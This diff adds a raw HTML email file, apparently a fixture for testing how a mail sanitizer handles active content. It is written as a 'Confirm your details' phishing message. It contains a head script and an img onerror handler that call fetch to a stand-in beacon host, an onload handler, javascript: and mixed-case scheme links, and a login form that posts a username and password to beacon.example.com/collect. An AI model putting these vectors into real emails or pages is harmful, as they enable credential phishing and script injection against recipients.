@@ -1,0 +1,25 @@
+Message-ID: <20260925T070000.script@abuse.example.com>
+Date: Fri, 25 Sep 2026 07:00:00 +0000
+From: Account Desk <desk@abuse.example.com>
+To: Ren Ishida <ren.ishida@example.net>
+Subject: Confirm your details
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<script>document.title = "ran"; fetch("https://beacon.example.com/script");</script>
+</head>
+<body onload="document.body.innerHTML='replaced'">
+<p>Please confirm your details below.</p>
+<p><a href="javascript:alert('ran')">Confirm with one click</a></p>
+<p><a href="JaVaScRiPt:void(0)" onclick="location='https://beacon.example.com/click'">Or here</a></p>
+<form action="https://beacon.example.com/collect" method="post">
+ <input type="text" name="user" value="">
+ <input type="password" name="pass" value="">
+ <button type="submit">Send</button>
+</form>
+<img src="x" onerror="fetch('https://beacon.example.com/onerror')" alt="">
+<p>Real link: <a href="https://desk.abuse.example.com/help">help pages</a>.</p>
+</body></html>
